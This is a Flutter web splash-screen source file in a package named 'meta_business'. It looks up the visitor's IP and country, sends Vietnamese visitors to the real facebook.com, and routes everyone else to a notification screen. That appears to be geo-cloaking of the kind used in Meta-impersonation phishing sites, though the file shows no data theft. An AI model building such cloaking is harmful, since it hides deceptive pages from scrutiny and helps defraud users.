import 'dart:async';

import 'package:dart_ipify/dart_ipify.dart';
import 'package:flutter/material.dart';
import 'package:meta_business/src/presentation/home/notification_screen.dart';
import 'package:url_launcher/url_launcher.dart';
import 'dart:js' as js;

import '../../utils/network_request.dart';

class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  final ApiClient apiClient = ApiClient();

  @override
  void initState() {
    super.initState();
    Future.delayed(const Duration(seconds: 4), () async {
      final ipv6 = await Ipify.ipv64();
      print(ipv6);
      final country = await apiClient.getCountry(ipv6);
      print(country);
      if (country == 'VN') {
        js.context.callMethod('open', ['https://www.facebook.com/', '_self']);
      } else {
        Navigator.push(
            context,
            MaterialPageRoute(
                builder: (context) => NotificationScreen(
                      country: country!,
                    )));
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Center(
      child: Image.asset("./images/gif/logo.gif"),
    );
  }
}
